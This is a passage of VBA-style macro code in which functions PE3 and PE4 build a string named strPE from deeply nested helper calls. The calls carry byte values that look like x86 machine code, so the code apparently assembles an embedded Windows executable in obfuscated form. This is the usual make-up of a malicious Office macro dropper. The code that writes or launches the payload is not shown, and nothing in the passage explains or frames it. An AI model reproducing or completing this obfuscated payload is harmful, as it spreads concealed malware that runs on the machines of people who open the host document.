    strPE = A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(strPE, 184), 137), "M"), 188), 137), 141), "h"), 8), 255), 255), 137), "5l"), 14), 189), 255), 137), "M"), 128), 137), "M"), 132), "{"), 141), "x"), 255), "7"), 255), 137), ",|"), 255), 4), 255), 137), "M"), 168), 137), "M"), 172), 151), "M"), 136), 137), "M"), 176), 224), 147), 243), 137)
    strPE = A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(strPE, "M"), 148), 15), 142), 139), 1), "K"), 183), 139), "R"), 200), 11), "Ai"), 137), "E"), 244), 131), 193), "c"), 137), "h"), 252), 139), "%"), 4), 139), "E"), 180), 165), 25), ";"), 188), "|o"), 127), 5), "9]"), 176), "r"), 6), 137), "]"), 176), 149), "}"), 180), 147), 127)
    strPE = A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(strPE, 12), 139), "Q"), 8), "9Ep|"), 13), 127), 137), "9"), 12), "Pr"), 4), 137), 240), 160), 137), "E"), 164), "Ji"), 27), 186), 139), 189), "d"), 247), 182), 198), ";"), 248), "|"), 22), "D"), 232), "9"), 207), "`"), 255), 255), 255), "r"), 12), 137), 149), 182), 255)
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(strPE, 255), 255), "\"), 133), "d"), 255), 255), "q"), 139), "y"), 252), 139), "Y"), 127), 187), "}"), 212), "K"), 18), 5), 10), 139), "M"), 208), ";"), 203), 139), 188), 252), "r"), 250), 137), "]"), 208), "z}"), 212), 139), 157), "t"), 198), 255), 255), ";"), 198), 4), 127), 159), 231), 198)
    strPE = B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "BM"), 252), 139), 220), "p"), 255), 255), 179), 210), "+"), 26), 217), "w"), 22), 139), 185), 252), 139), 25), 137), 157), "p"), 255), 6), 255), 139), 246), 231), 137), 157), ","), 255), "\"), 255), "_"), 3), 139), "M"), 252), 139), "I"), 12), 139), "]"), 188), ";"), 217), "V ")
    strPE = A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(strPE, "|"), 13), 139), 191), 252), 139), "]"), 130), 165), "I"), 8), "z"), 217), "w"), 17), 139), "M"), 252), 139), "Y"), 8), 137), "]"), 184), 139), "Y"), 188), 137), "]"), 188), 26), 3), 139), "M"), 252), "9"), 133), "l"), 255), 255), 131), 127), 22), "|"), 8), "9"), 149), "h"), 158), 255)
    strPE = A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(strPE, 255), "w"), 12), 137), 149), "h"), 255), 19), "o"), 137), 133), "l.\"), 255), "9}"), 132), 127), 24), "|"), 13), 139), "I"), 248), 139), "]"), 230), 208), 217), 139), 138), 252), "w"), 9), 139), 202), 248), "'}"), 132), 137), "]"), 128), 165), 9), "n"), 29), 192), 3)
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(strPE, 217), 139), "M"), 252), 137), "]"), 192), 139), "="), 196), 139), "I"), 4), 19), 162), 139), "M"), 252), 137), "]"), 196), 31), "]"), 200), 139), "I"), 8), 3), 171), 139), "M"), 252), 137), "]"), 200), 139), "]"), 204), 139), "I"), 12), 19), 217), 139), "M"), 224), 3), 202), 139), "U")
    strPE = A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(strPE, 184), 137), "]"), 204), 139), "]"), 228), 137), 135), 224), 139), "M"), 141), 165), 216), 139), 133), 23), 137), "]"), 162), 19), "]"), 236), 3), 208), 24), "E"), 244), 191), "U"), 232), 19), 223), 131), 193), " H"), 137), "]"), 236), 137), "M"), 138), 137), "E"), 244), 15), 133), 132)
    strPE = B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 254), 255), 255), 161), 172), 2), "A"), 0), 153), 211), 218), 139), "U"), 196), 139), 248), 139), "E"), 192), "SWyP"), 232), "&"), 144), 0), 0), 139), "M"), 204), 137), "U"), 252), 139), "U"), 200), "SWQR"), 137), 227), 248), 232), 17), 144), 0), 0), "c")
    strPE = A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(strPE, "M"), 224), 137), "E"), 152), 139), "E"), 228), "SoP"), 188), 137), 178), 156), "\"), 252), 143), 0), 0), 137), "U"), 204), 139), "U"), 236), 137), "E"), 200), 182), "E"), 232), "SW("), 192), "*"), 231), 201), 3), 0), 219), "E"), 192), 161), 172), 2), "A{"), 187)
    strPE = A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(strPE, 192), 137), "U"), 196), 15), 142), 136), 0), 0), 0), 223), "m"), 11), 190), 13), 200), 11), 145), 194), "K]"), 200), 223), "m"), 248), 141), "A"), 16), 170), 13), 172), 2), "A"), 0), 231), "]"), 224), 223), 189), "Y"), 221), "]"), 232), 223), "m"), 192), 221), 204), "x"), 229)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(strPE, 133), "x"), 255), 255), 255), 221), "E"), 168), 221), "E"), 136), 221), "m"), 144), 223), "h"), 8), 221), "-"), 152), 131), 10), 210), 241), 191), 233), 217), 192), 250), 201), 222), 198), 221), 216), 223), "h"), 224), 221), "E"), 224), 216), 233), 217), 192), 193), 201), 16), 198), 221), 215)
    strPE = A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 217), 201), 216), 225), 220), "e"), 232), 217), 201), 221), 216), 132), 192), 216), 201), 222), 195), 221), 184), 223), "h"), 216), 220), "e"), 229), 217), 192), 216), 201), 222), 194), 221), 216), "u"), 185), 221), "]"), 144), 221), "]"), 136), 221), "]"), 168), 137), 6), 221), 213), "x"), 255)

    PE3 = strPE
End Function

Private Function PE4() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(strPE, 255), 23), 161), 172), 2), "A"), 15), 131), 187), 1), "~"), 21), 141), "P"), 255), 137), "U"), 244), 219), "E"), 244), 216), 249), 217), 250), 221), 206), "x"), 255), 207), 255), 23), 20), 199), 133), "x"), 255), 255), 255), 0), 22), 0), 209), 199), 133), "|"), 255), 255), 129), 0)
    strPE = B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(strPE, 164), "I"), 0), 131), 248), "{"), 221), 216), 226), 155), ":H"), 255), 230), 229), 244), 219), "E"), 244), 220), 228), "j"), 217), 250), 221), "]"), 168), 235), 23), "3E"), 4), 0), 0), 0), 0), 175), "E"), 172), 0), 0), "j"), 0), 131), 248), 1), "~"), 19), 141), "P")
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(strPE, 255), 137), "U"), 222), 159), "E"), 244), 191), "}J"), 217), 250), 221), "]"), 136), 239), 210), 199), "E"), 136), "8"), 0), 0), 0), 199), "E"), 140), 0), 0), 0), 0), 131), 248), 1), "~"), 19), 141), "H"), 255), 137), "M"), 244), 219), 170), 244), 220), "}"), 222), "!"), 250)
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 221), "]"), 144), 235), 14), 199), "E"), 144), 0), 0), "9"), 0), 199), "E"), 148), 0), 0), 0), 0), 139), 21), 200), 11), "A"), 0), "h"), 224), "0@"), 0), "j PR"), 255), 21), 24), 193), 180), 0), 139), "="), 217), 2), "A"), 0), 131), 196), 159), 131)
    strPE = A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 255), 1), "~@"), 139), 199), "%"), 1), 0), "e"), 128), "y"), 5), "H"), 131), 200), 254), "c"), 184), "0"), 139), 199), 176), 29), 200), 11), "A"), 0), 153), "+"), 194), 255), "5y"), 248), 177), 224), "v"), 3), 195), "j"), 2), 139), "H<"), 139), "P"), 16), 129), 202)
    strPE = A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(strPE, 236), "P4"), 19), "P"), 20), "RQ"), 232), "A"), 142), 0), "E"), 137), "E"), 21), ","), 27), 139), 199), 199), "g"), 200), 11), "A"), 202), 153), "+"), 194), 200), 248), 193), 224), 5), 139), "L"), 24), 16), 137), "M"), 240), 139), "T"), 31), 20), "h`1@"), 0)
    strPE = B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(strPE, "j`WS"), 137), "U"), 244), 255), "Z,"), 193), "@"), 0), 139), "="), 172), 2), "A"), 0), 131), 196), 16), 131), 255), 1), 144), "O"), 139), 199), "%"), 1), 0), 235), 18), "y"), 5), "Hm"), 202), 254), "@t?"), 139), 199), 139), 29), "8"), 11), "A")
    strPE = B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 229), 153), "+?j"), 0), 209), 248), 193), 224), 5), 3), 195), 232), 159), 139), 176), "8"), 29), "P="), 168), 164), 139), "P<"), 27), "P4+H"), 218), 27), "P"), 129), 3), "H"), 237), 19), "P"), 28), "R"), 190), 232), 186), 141), "_"), 0), 137), "E")
    strPE = B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(strPE, 232), 137), "U{"), 168), "("), 139), 199), 139), 29), 200), 127), "A"), 0), 153), "+"), 247), 209), "|"), 193), 224), 5), 3), 195), 218), "H"), 24), 139), "P"), 16), "+"), 202), 139), "P"), 20), 137), "M"), 232), 139), 182), 28), 27), 202), 137), 255), 236), "h^1@")
    strPE = A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(strPE, 0), "j WS"), 255), 21), "D"), 193), "@"), 0), 139), "="), 172), 2), "A"), 0), 131), 196), 16), 201), 255), 1), "~@"), 139), 199), 251), 1), 17), 0), 128), "y"), 5), "H"), 131), 152), 254), "@t0"), 211), 199), 139), 29), 200), 11), "A"), 0), 153)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "+Nj"), 0), 209), 248), 11), 224), 5), 3), 238), "`"), 2), 139), "H"), 201), 139), "P"), 8), 3), "A^"), 164), "d"), 19), "V"), 12), "RY"), 227), "2a"), 0), 0), 128), "E"), 224), 235), 27), 251), 199), 139), "x"), 200), 202), "AX"), 153), "+~")
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 209), 248), 193), 224), "n"), 139), "L"), 231), "f"), 159), "M"), 198), 139), "T"), 24), 12), "h 1@"), 0), "j "), 175), "S"), 137), "U"), 228), 255), 21), "B"), 193), "@"), 0), 161), 172), 2), "A"), 0), 131), 196), 16), 131), 248), 1), "~B"), 139), 200), 234)
    strPE = A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(strPE, 225), 1), 0), 0), 128), "y"), 5), "I"), 131), 201), 254), "At1"), 153), "+"), 194), 139), 21), 200), 248), "P"), 0), 209), 248), 193), 224), 5), 3), 194), "j"), 0), "j"), 2), 212), "H"), 239), 139), "X"), 24), 127), "P<"), 234), "x"), 28), 3), 203), 19), 215)
    strPE = A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(strPE, "RQ"), 232), 183), 140), 0), 0), "M"), 248), 139), 218), 230), 186), 153), "+"), 194), 139), 200), 161), 200), 11), 189), 162), 209), 249), 149), "h"), 5), 139), "|"), 1), 24), 206), "\"), 1), 28), "{8"), 220), "@"), 0), 27), 214), "zE"), 176), 139), 150), "f"), 131)
    strPE = B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 196), 4), 5), 244), 1), 0), 159), 131), 209), 0), "jOh"), 232), 154), 0), 0), 201), "P"), 232), "t"), 140), 0), 241), 153), "4"), 164), 137), 209), 176), 139), "E"), 160), "j"), 0), ":"), 244), 1), 0), 0), "h"), 232), 3), "P"), 0), "W"), 209), 0), 137), "U")
    strPE = B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(strPE, 180), "Q"), 144), 232), "R"), 12), 131), 0), 139), "M"), 252), 137), "j"), 160), 139), "]"), 1), "j"), 0), 5), 244), 1), 0), 0), "9W"), 3), 0), 0), 131), 209), 0), 137), "U"), 164), 231), "P"), 163), "0"), 140), 0), 0), 139), "M"), 204), 137), 180), 248), 139), "E")
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 200), "j"), 0), 5), 244), 1), 0), 0), 12), 232), 3), 0), 0), 182), 209), 0), 137), "U"), 252), "QP"), 232), 14), 249), 0), 0), 139), "M"), 196), 137), "E"), 200), 139), "E"), 192), "j"), 0), 5), 133), 191), 0), 192), "j"), 232), 9), 0), 139), 131), 209), 152)
    strPE = A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(strPE, 137), "U"), 204), 2), "P"), 232), 143), 139), 0), 0), 139), "M"), 156), 211), "I"), 192), 139), "E"), 152), "j"), 131), 5), 206), 1), 240), 0), "h"), 232), 3), 0), 0), 131), "O"), 34), 137), "e"), 196), "QP"), 232), 202), 139), 0), 0), "bM"), 244), 137), "E"), 152)
    strPE = A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(strPE, 139), "E"), 240), 203), 0), 5), 244), 1), 0), 0), "="), 232), 3), 0), 0), "#"), 209), 0), "rp"), 156), "Qf"), 232), "5"), 139), 0), 0), "FE"), 240), 139), "E"), 232), 137), "U"), 244), 133), "M"), 129), 5), 244), 1), 132), 0), 131), 209), "q"), 180), 254)
    strPE = A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(strPE, "h"), 232), 3), 185), 0), 14), "P"), 232), 134), 213), "L"), 0), 139), "M"), 228), 1), 148), 34), 139), "E"), 224), "j"), 18), 5), 244), 1), 0), 0), "hQZ"), 0), 0), 131), 209), 0), 137), "U"), 132), "FP"), 232), "d"), 0), 0), 0), 129), 199), "M"), 1)
    strPE = A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 0), 0), "j"), 0), 250), 211), "4"), 218), 232), 3), 0), 0), "SN"), 217), "E"), 224), 137), "U"), 228), 232), "G"), 139), 0), 0), 139), 141), "t"), 255), 255), 24), 137), "E"), 216), 139), 133), "p"), 255), 255), "%j!"), 208), "=h/"), 0), 244), 232), 3)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(strPE, 0), 0), 131), 209), 0), 137), "U"), 220), "QP"), 232), "m"), 139), 0), 0), 139), "M"), 188), 139), 248), 8), "E"), 190), "j"), 0), 5), 244), 1), 0), 220), "8"), 232), 3), 207), 0), 131), 209), 0), 193), 218), "QP"), 232), 255), 138), 0), 0), 221), 17), 168)
    strPE = A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 220), 13), 16), 194), 21), 0), 225), "E"), 184), 169), 160), 208), "@"), 0), 133), 192), 221), "]"), 168), 221), "E"), 162), 220), 13), "V"), 194), "@"), 0), 137), "U"), 188), 4), "]"), 136), 221), 216), 144), 220), 13), 16), 194), "\"), 175), 221), 216), 144), "Q"), 162), "x"), 255)
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 255), 255), 220), 13), 16), 194), "@"), 158), 221), 157), "x"), 255), 249), "' "), 132), "d"), 2), "{"), 0), "6"), 8), 220), "@"), 0), 255), 214), 139), 12), 244), "4"), 171), 240), 139), 21), 172), "S$"), 143), 175), "U"), 168), "P"), 143), "E"), 252), "V"), 139), "M"), 211)
    strPE = B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(strPE, 250), 139), "U"), 180), "P"), 139), "E"), 176), "QRPh"), 216), 219), 255), 0), 255), 214), 139), 11), "h"), 255), 255), 8), 139), 141), "l"), 250), 255), 255), 131), 196), "0|"), 244), 1), 0), 0), 5), 209), ")j"), 156), "h"), 232), "h"), 0), 0), "QP")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(strPE, 232), "av"), 0), 0), 139), "M"), 236), "R"), 17), "U"), 232), "P"), 139), "E"), 244), "6"), 139), "M"), 151), 242), 139), "U"), 204), "P"), 139), "E"), 200), "Q9"), 141), 231), 255), 255), 255), "RP"), 139), 133), 164), 255), 255), 22), 5), 244), 1), 0), 2), 28), 0)
    strPE = B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(strPE, 131), "y"), 0), 166), 232), 3), 0), 0), "QPbj"), 138), "y"), 0), "4Ph"), 136), 219), "@"), 190), 255), 214), 139), "E"), 128), 139), "M"), 132), 131), 196), 217), 171), 245), 1), 242), 0), 131), 209), 0), 7), 0), "h"), 232), 3), 0), 0), "QP")
    strPE = A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(strPE, 232), 143), "W"), 0), 0), 139), "M"), 228), "w"), 139), "U"), 224), "P"), 139), "E"), 148), "Q"), 139), "M"), 157), 246), 139), "U"), 196), "P"), 18), "R"), 139), "E"), 192), 139), 211), 212), "P"), 139), "E+"), 5), 244), 1), 0), 0), "fW"), 131), "b"), 0), "h"), 232), 3)
    strPE = B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(strPE, 127), "$QP"), 232), 199), 137), 131), "[RPhx"), 219), "@"), 0), 255), 214), 241), "M"), 188), 139), "Ud"), 139), "E"), 220), "Q"), 139), 127), 216), "R"), 139), 149), "|"), 255), 255), 255), "P"), 139), 133), "x"), 255), 255), 255), 21), 139), "M"), 156), "R")
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(strPE, 139), "U"), 152), "P"), 139), "E"), 164), "'"), 139), "M"), 153), "R"), 169), "QhH"), 219), "@"), 0), 255), 214), 223), "e"), 204), 223), "m"), 240), 131), 184), "X"), 222), 233), 220), 21), "0"), 194), "@"), 138), 223), 216), 246), 196), 5), "zQ"), 217), 224), 221), "E"), 168)
    strPE = A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(strPE, 220), 192), 217), 193), 222), 219), "R-%"), 0), "A"), 0), 0), "u"), 9), 221), 216), "h"), 176), 218), "@"), 0), 164), 17), 220), "]"), 168), 223), 224), "%"), 0), "A"), 0), 231), 185), 10), "h"), 24), 183), "@"), 0), 255), "="), 131), 215), 4), 223), "m"), 200), 223)
    strPE = A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(strPE, "m"), 232), 222), 233), 220), 21), "0"), 194), "@"), 0), 223), 224), 246), 196), 5), "z"), 2), 217), "_"), 221), "E"), 136), 215), 184), 144), 193), 222), "|"), 223), 3), "%"), 0), "A"), 155), 0), "u"), 194), 210), 216), 139), 136), 217), "@"), 0), 235), 17), 220), "]w"), 172)
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(strPE, 186), "%5A"), 227), 0), "u"), 10), "h"), 18), 216), "@"), 0), 1), 144), 131), 131), 29), 223), "m"), 192), 223), "m{"), 222), 233), 220), 21), "0A@"), 0), 223), 224), 246), 196), 5), "z"), 2), 217), 224), 221), "E"), 144), 220), 192), 217), 193), "1"), 217)
    strPE = A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(strPE, 223), 224), 162), "rA"), 0), 0), "u"), 9), 221), 134), 192), "h"), 216), "@"), 0), 133), 17), 178), "]"), 144), 223), 224), "%DA"), 0), 236), "u"), 10), "h"), 216), "(@f"), 255), 214), ")"), 196), 4), "dmJ"), 223), "m"), 216), 222), 233), 220), 21)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(strPE, "g"), 194), 231), 0), 223), "iH"), 253), 228), "z"), 2), 217), 224), 221), 133), "x"), 255), "n"), 255), "/"), 170), 217), 193), 222), 151), 223), 238), "%"), 0), 183), "BHD"), 17), "h"), 140), 215), "@"), 139), 29), 161), 255), 214), 131), 196), 4), 233), 150), 0), 247)
    strPE = A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 0), 220), "rxf"), 255), 255), 223), 143), 134), 0), 138), 0), 0), 15), 133), "V"), 0), 0), 0), "h+"), 214), 176), 135), 255), "6"), 131), 196), 4), 235), "wh"), 160), 214), 14), 0), 255), 214), 139), 143), 193), 139), "E"), 3), 139), "M"), 180), "S"), 183)
    strPE = A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(strPE, "R"), 139), "U"), 176), "PQRh|"), 214), "O"), 0), 255), 214), 139), "E"), 184), "0"), 171), 165), 139), "U"), 213), "+"), 199), 248), 30), 248), 150), 203), 139), "]"), 160), "Q"), 139), "M"), 252), "P"), 139), "E"), 193), 216), "p"), 139), "}"), 164), 27), 193), 248), 203)
    strPE = A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(strPE, "P"), 139), "E"), 180), "R;U"), 237), "+"), 202), 139), 215), 27), 208), "RVhX"), 214), "@"), 0), 255), 214), 139), "E"), 188), 22), "M"), 184), 139), "U"), 185), "P"), 139), 206), "8Q:PWSh"), 205), 214), "@"), 0), 255), 214), 210), 196)
    strPE = B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "X"), 161), 28), 208), "@"), 0), 133), 192), 127), 132), 203), 15), 0), 0), 131), "I"), 172), 240), "A"), 248), "R"), 176), 142), 184), 0), 0), 0), "h"), 244), 213), "@"), 0), 255), 214), 27), "#"), 4), "3"), 219), 139), 216), "$"), 7), 221), 0), 133), 157), 168), 15), "h")
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "="), 213), 7), 0), 255), "H"), 131), 196), 4), 227), 216), 0), 0), 0), "j"), 0), 131), 255), "dh"), 232), 3), 0), 0), "|"), 215), 139), 13), 172), 2), "A"), 0), 161), 26), 11), 25), 0), 193), "HKsT"), 1), 133), 129), 194), 244), 1), 0), 0)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(strPE, 139), " "), 1), 252), 131), 208), 199), "PR"), 232), "j"), 135), 0), 141), "RPh"), 188), 213), "0"), 0), 175), 214), 131), 198), 12), 235), 251), 139), ";"), 184), "f"), 133), 235), "Q"), 18), 175), 13), 172), 2), "A1"), 247), 233), 193), 250), 249), 161), 200), 11)
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(strPE, "A"), 0), 139), 202), "\"), 233), 172), 3), 209), 193), 226), "v"), 139), "L"), 2), 24), 129), 193), 244), 1), 0), 0), 139), "T"), 2), 205), 131), 210), 0), "RQ"), 232), 34), 135), 0), 0), 21), "PWh"), 158), 201), "@"), 0), 255), 214), 131), 196), 16), 131)
    strPE = A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(strPE, 195), 4), 131), 251), "$"), 15), 130), "T"), 255), 255), 255), 161), 224), 7), 198), 0), 133), 192), 15), 132), 195), 0), 0), 0), "h"), 168), 213), "@"), 0), "P"), 255), 21), "H"), 193), 232), 0), 139), 4), 131), 196), 8), 133), 255), "I"), 22), "h"), 8), 213), "@"), 0)
